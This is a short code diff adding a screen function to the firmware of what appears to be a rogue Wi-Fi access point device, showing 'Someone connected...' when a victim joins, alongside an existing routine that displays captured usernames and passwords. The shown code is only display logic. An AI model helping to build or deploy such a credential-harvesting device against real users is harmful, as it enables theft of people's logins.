@@ -50,6 +50,17 @@ void Screen::displayStartingAP(uint8_t sec) {
   delay(sec * 1000);
 }
 
+void Screen::displayVictimConnected(){
+  display.clear();
+  display.drawXbm(0, 0, 128, 64, medium_signal_bits);
+  display.drawString(3, 15, "Someone ");
+  display.drawString(3, 25, "connected...");
+  display.drawLine(0, 53, 127, 53);
+  display.drawLine(0, 54, 127, 54);
+  display.drawString(0, 54, sectionText);
+  display.display();
+}
+
 void Screen::displayCredsFound(String username, String password) {
   display.clear();
   display.drawXbm(0, 0, 128, 64, high_signal_bits);
